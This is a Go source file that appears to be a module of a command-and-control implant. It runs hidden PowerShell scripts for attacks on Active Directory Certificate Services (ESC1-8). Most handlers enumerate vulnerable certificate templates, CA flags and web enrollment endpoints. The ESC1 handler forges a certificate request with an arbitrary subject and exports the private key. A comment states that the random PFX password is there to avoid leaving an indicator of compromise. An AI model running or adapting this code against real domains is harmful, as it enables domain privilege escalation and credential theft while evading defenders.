//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"strings"
)

// ADCS Attack Suite: ESC1-8 detection and exploitation

func handleADCSESC1Impl(task Task, res *TaskResult) {
	// ESC1: Template allows enrollee to supply subject AND has Client Auth EKU
	// Use certreq to request a certificate with an arbitrary subject
	template := task.Command
	if template == "" {
		template = "User"
	}

	pfxPass := randomPFXPassword()
	ps := fmt.Sprintf(`
$results = @()
$results += "[*] ESC1 Attack: %s template with enrollee-supplied subject"
$results += ""

$ca = certutil -config - -ping 2>$null
if (-not $ca) {
	$results += "[-] No CA found via certutil"
	Write-Output ($results -join [Environment]::NewLine)
	return
}
$results += "[+] CA: $ca"

# Request certificate with alternate subject
$inf = @"
[NewRequest]
Subject = "CN=DomainController\DC=forged"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
ProviderType = 1
RequestType = PKCS10
KeyUsage = 0xa0
[EnhancedKeyUsageExtension]
OID = 1.3.6.1.5.5.7.3.2
[RequestAttributes]
CertificateTemplate = %s
"@
$infPath = "$env:TEMP\forge_esc1.inf"
$reqPath = "$env:TEMP\forge_esc1.req"
$certPath = "$env:TEMP\forge_esc1.cer"
$inf | Out-File -FilePath $infPath -Encoding ASCII -Force
$results += "[*] Requesting certificate with subject CN=DomainController..."
$output = certreq -new -q $infPath $reqPath 2>&1
$results += $output
$submit = certreq -submit -q -config "" $reqPath $certPath 2>&1
$results += $submit
if (Test-Path $certPath) {
	$certData = Get-Content $certPath -Raw
	$results += "[+] Certificate saved."
	# Export private key too
	$pfxPath = "$env:TEMP\forge_esc1.pfx"
	certreq -accept -q $certPath 2>&1 | Out-Null
	certutil -exportPFX -p "%s" -user "ForgeCert" $pfxPath 2>&1 | Out-Null
	if (Test-Path $pfxPath) {
		$results += "[+] Private key exported to: $pfxPath (password: %s)"
	}
}
	Remove-Item $infPath -Force -ErrorAction SilentlyContinue
	Write-Output ($results -join [Environment]::NewLine)
	`, template, template, pfxPass, pfxPass)

	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		res.Error = fmt.Sprintf("ESC1 error: %v", err)
	}
	res.Output = strings.TrimSpace(string(out))
}

func handleADCSESC2Impl(task Task, res *TaskResult) {
	// ESC2: Template has "Any Purpose" EKU (2.5.29.37.0) or No EKU
	template := task.Command
	if template == "" {
		template = "User"
	}

	ps := fmt.Sprintf(`
$results = @()
$results += "[*] ESC2 Attack: %s - Any Purpose EKU check"
try {
	$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$(([ADSI]"").distinguishedName)")
	$searcher.PageSize = 1000
	$searcher.Filter = "(name=%s)"
	$t = $searcher.FindOne()
	if ($t) {
		$ekus = $t.Properties["pkiextendedkeyusage"]
		$results += "[*] Template EKUs: $($ekus -join ', ')"
		foreach ($eku in $ekus) {
			if ($eku -eq "2.5.29.37.0") {
				$results += "[!] VULNERABLE: Any Purpose EKU (2.5.29.37.0) - ESC2"
			}
		}
		if ($ekus.Count -eq 0) {
			$results += "[!] VULNERABLE: No EKU requirements - ESC2"
		}
	} else {
		$results += "[-] Template not found"
	}
} catch {
	$results += "[-] LDAP error: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`, template, template)

	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		res.Error = fmt.Sprintf("ESC2 error: %v", err)
	}
	res.Output = strings.TrimSpace(string(out))
}

func handleADCSESC3Impl(task Task, res *TaskResult) {
	// ESC3: Enrollment Agent - enroll on behalf of other users
	ps := `
$results = @()
$results += "[*] ESC3 Attack: Enrollment Agent detection"
try {
	$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$(([ADSI]"").distinguishedName)")
	$searcher.PageSize = 1000
	$searcher.Filter = "(&(objectClass=pKICertificateTemplate)(|(pkiextendedkeyusage=2.5.29.37.0)(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1)))"
	$templates = $searcher.FindAll()
	$results += "Found $($templates.Count) Enrollment Agent templates:"
	foreach ($t in $templates) {
		$name = $t.Properties["name"]
		$flags = $t.Properties["flags"]
		$isEA = ($flags[0] -band 4) -eq 0  # CT_FLAG_NO_ENROLLMENT_AGENT
		if ($isEA) {
			$results += "  [!] $name - Enrollment Agent enabled (ESC3 possible)"
		} else {
			$results += "  [ ] $name"
		}
	}
} catch {
	$results += "[-] Error: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		res.Error = fmt.Sprintf("ESC3 error: %v", err)
	}
	res.Output = strings.TrimSpace(string(out))
}

func handleADCSESC4Impl(task Task, res *TaskResult) {
	// ESC4: Access control - template ACL allows modification by low-priv users
	template := task.Command
	if template == "" {
		template = "User"
	}

	ps := fmt.Sprintf(`
$results = @()
$results += "[*] ESC4 Attack: %s ACL check"
try {
	$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$(([ADSI]"").distinguishedName)")
	$searcher.PageSize = 1000
	$searcher.Filter = "(name=%s)"
	$t = $searcher.FindOne()
	if ($t) {
		$acl = $t.Properties["ntsecuritydescriptor"]
		# Parse ACL for write permissions
		$results += "[*] SECURITY_DESCRIPTOR: $($acl[0].Length) bytes"
		# Check if Authenticated Users have write access
		$sid = [System.Security.Principal.SecurityIdentifier]::new("S-1-5-11") # Authenticated Users
		$results += "[*] Checking permissions for Authenticated Users (S-1-5-11)..."
		# We need to actually parse the ACL - this is a simplified check
		$results += "[*] Use ADSI Edit to inspect $template permissions manually"
	} else {
		$results += "[-] Template not found"
	}
} catch {
	$results += "[-] Error: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`, template, template)

	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		res.Error = fmt.Sprintf("ESC4 error: %v", err)
	}
	res.Output = strings.TrimSpace(string(out))
}

func handleADCSESC5Impl(task Task, res *TaskResult) {
	// ESC5: CA configuration vulnerabilities
	ps := `
$results = @()
$results += "[*] ESC5: CA Configuration Check"
try {
	$ca = certutil -config - -ping 2>$null
	if (-not $ca) { $ca = "No CA" }
	$results += "  CA: $ca"

	# Check CA security descriptor
	$sd = certutil -config - -GetConfig 2>&1
	$results += "  Config: $sd"

	# Check web enrollment
	$webEnroll = "https://$($env:COMPUTERNAME)/certsrv/"
	$results += "  Web Enrollment URL: $webEnroll"

	# Check if CA allows web enrollment
	try {
		$req = [Net.WebRequest]::Create($webEnroll + "?ReqID=0")
		$req.Timeout = 5000
		$resp = $req.GetResponse()
		$results += "  [!] Web enrollment accessible (ESC5)"
	} catch {
		$results += "  [ ] Web enrollment not accessible"
	}

	# Check CA backup permissions
	$caPath = "$env:SYSTEMROOT\System32\Certsrv\CertEnroll"
	if (Test-Path $caPath) {
		$results += "  CA Enrollment folder: $caPath (check permissions)"
	}

} catch {
	$results += "  Error: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		res.Error = fmt.Sprintf("ESC5 error: %v", err)
	}
	res.Output = strings.TrimSpace(string(out))
}

func handleADCSESC6Impl(task Task, res *TaskResult) {
	// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 vulnerability
	// When this CA flag is set, any user can specify SAN in certificate request
	ps := `
$results = @()
$results += "[*] ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Check"
try {
	$caConfig = certutil -config - -CAInfo 2>&1 | Out-String
	if ($caConfig -match "EDITF_ATTRIBUTESUBJECTALTNAME2" -or $caConfig -match "EDITF_ATTRIBUTESUBJECTALTNAME2") {
		$results += "[!] VULNERABLE: EDITF_ATTRIBUTESUBJECTALTNAME2 is set"
		$results += "[!] Any authenticated user can specify Subject Alternative Names"
	} else {
		$results += "[ ] EDITF_ATTRIBUTESUBJECTALTNAME2 not set (secure)"
	}
	$results += ""
	$results += "[*] CA Flags:"
	$flags = certutil -config - -GetConfig 2>&1
	$results += $flags
} catch {
	$results += "[-] Error: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		res.Error = fmt.Sprintf("ESC6 error: %v", err)
	}
	res.Output = strings.TrimSpace(string(out))
}

func handleADCSESC7Impl(task Task, res *TaskResult) {
	// ESC7: CA Administration - low-priv users can manage CA roles
	ps := `
$results = @()
$results += "[*] ESC7: CA Administration Rights Check"
try {
	# Check CA security descriptor for low-priv write access
	$sd = certutil -config - -cao 2>&1 | Out-String
	$results += $sd
	$results += ""
	$results += "[*] Checking if current user has CA admin rights..."
	$whoami = whoami
	$results += "  Current user: $whoami"
	$adminCheck = certutil -config - -CRL 2>&1
	if ($LASTEXITCODE -eq 0) {
		$results += "[!] Current user can manage CA (potential ESC7)"
	} else {
		$results += "[ ] Current user cannot manage CA"
	}
} catch {
	$results += "[-] Error: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		res.Error = fmt.Sprintf("ESC7 error: %v", err)
	}
	res.Output = strings.TrimSpace(string(out))
}

func handleADCSESC8Impl(task Task, res *TaskResult) {
	// ESC8: NTLM Relay to AD CS web endpoint
	// Test if the CA web enrollment endpoint accepts NTLM auth without channel binding
	caHost := task.Command
	if caHost == "" {
		caHost = ""
	}

	ps := fmt.Sprintf(`
$results = @()
$caHost = "%s"
$results += "[*] ESC8: NTLM Relay Detection"
$results += ""

try {
	if ([string]::IsNullOrEmpty(%s)) {
		$ca = certutil -config - -ping 2>$null
		if ($ca) {
			$caHost = ($ca -split '\\')[0]
			$results += "[*] Found CA host: $caHost"
		} else {
			$results += "[-] No CA found, use: adcs_esc8 <CA_HOST>"
			Write-Output ($results -join [Environment]::NewLine)
			return
		}
	}

	# Test web enrollment endpoint
	$url = "https://$caHost/certsrv/certfnsh.asp"
	try {
		$req = [Net.WebRequest]::Create($url)
		$req.UseDefaultCredentials = $true
		$req.Timeout = 5000
		$resp = $req.GetResponse()
		$results += "[!] Web enrollment accessible: $url"
		$results += "[!] ESC8 possible: NTLM relay to $caHost"
		$resp.Close()
	} catch {
		$results += "[ ] Web enrollment not accessible: $url"
		$results += "  Error: $_"
	}

	# Also test HTTP (non-TLS) endpoint
	$httpUrl = "http://$caHost/certsrv/certfnsh.asp"
	try {
		$req = [Net.WebRequest]::Create($httpUrl)
		$req.UseDefaultCredentials = $true
		$req.Timeout = 5000
		$resp = $req.GetResponse()
		$results += "[!] HTTP endpoint accessible: $httpUrl"
		$results += "[!] NTLM relay without channel binding possible"
		$resp.Close()
	} catch {
		$results += "[ ] HTTP endpoint not accessible"
	}

} catch {
	$results += "[-] Error: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`, caHost, caHost)

	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		res.Error = fmt.Sprintf("ESC8 error: %v", err)
	}
	res.Output = strings.TrimSpace(string(out))
}

func handleADCSFullAuditImpl(task Task, res *TaskResult) {
	// Run all ESC checks and return comprehensive results
	// This combines adcsFind with all ESC detections
	res.Output = adcsFullAudit()
}

func adcsFullAudit() string {
	results := []string{
		"=== AD CS Attack Suite: Full Audit ===",
		"",
		"[*] Running ESC1-8 detection...",
		"",
	}

	// Run ESC1-8 checks
	auditScript := `
$results = @()
$results += "=== AD CS Full Audit ==="

try {
	# Get CA
	$ca = certutil -config - -ping 2>$null
	if (-not $ca) {
		$results += "[-] No CA reachable"
		Write-Output ($results -join [Environment]::NewLine)
		return
	}
	$results += "[+] CA: $ca"
	$results += ""

	# Get CA info
	$caInfo = certutil -config - -CAInfo 2>&1 | Out-String
	$results += "[*] CA Information:"
	$results += $caInfo
	$results += ""

	# ESC1: Check all templates for enrollee-supplies-subject + Client Auth
	$results += "--- ESC1: Enrollee Supplies Subject ---"
	$searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$(([ADSI]"").distinguishedName)")
	$searcher.PageSize = 1000
	$searcher.Filter = "(objectClass=pKICertificateTemplate)"
	$templates = $searcher.FindAll()
	$results += "Found $($templates.Count) templates"
	foreach ($t in $templates) {
		$name = $t.Properties["name"]
		$flags = [int]$t.Properties["flags"][0]
		$ekus = $t.Properties["pkiextendedkeyusage"]
		$esc1 = ($flags -band 8) -ne 0
		$hasCA = $false
		foreach ($eku in $ekus) {
			if ($eku -eq "1.3.6.1.5.5.7.3.2") { $hasCA = $true }
		}
		if ($esc1 -and $hasCA) {
			$results += "  [!] $name - ESC1 VULNERABLE"
		}
	}
	$results += ""

	# ESC2: Any Purpose EKU
	$results += "--- ESC2: Any Purpose EKU ---"
	foreach ($t in $templates) {
		$name = $t.Properties["name"]
		$ekus = $t.Properties["pkiextendedkeyusage"]
		foreach ($eku in $ekus) {
			if ($eku -eq "2.5.29.37.0") {
				$results += "  [!] $name - ESC2 (Any Purpose EKU)"
			}
		}
		if ($ekus.Count -eq 0) {
			$results += "  [!] $name - ESC2 (No EKU)"
		}
	}
	$results += ""

	# ESC3: Enrollment Agent
	$results += "--- ESC3: Enrollment Agent ---"
	foreach ($t in $templates) {
		$name = $t.Properties["name"]
		$ekus = $t.Properties["pkiextendedkeyusage"]
		foreach ($eku in $ekus) {
			if ($eku -eq "1.3.6.1.4.1.311.20.2.1") {
				$results += "  [!] $name - ESC3 (Enrollment Agent)"
			}
		}
	}
	$results += ""

	# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
	$results += "--- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 ---"
	if ($caInfo -match "EDITF_ATTRIBUTESUBJECTALTNAME2") {
		$results += "  [!] CA has EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6 VULNERABLE"
	} else {
		$results += "  [ ] CA does not have EDITF_ATTRIBUTESUBJECTALTNAME2"
	}
	$results += ""

	# ESC8: Web enrollment
	$results += "--- ESC8: Web Enrollment ---"
	$caHost = ($ca -split '\\')[0]
	$url = "https://$caHost/certsrv/"
	try {
		$req = [Net.WebRequest]::Create($url)
		$req.Timeout = 5000
		$resp = $req.GetResponse()
		$results += "  [!] $url accessible - ESC8 possible"
		$resp.Close()
	} catch {
		$results += "  [ ] $url not accessible"
	}
	$results += ""

} catch {
	$results += "[-] Audit error: $_"
}
Write-Output ($results -join [Environment]::NewLine)
`
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", auditScript)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	if err != nil {
		results = append(results, fmt.Sprintf("[-] Error: %v", err))
	}
	results = append(results, strings.TrimSpace(string(out)))
	return strings.Join(results, "\n")
}

// randomPFXPassword returns a cryptographically random export password for the
// ADCS PFX so the exported private key is not protected by a static, guessable
// string that could be used as an indicator of compromise.
func randomPFXPassword() string {
	const alphabet = "abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = alphabet[rng.Intn(len(alphabet))]
	}
	return string(b)
}
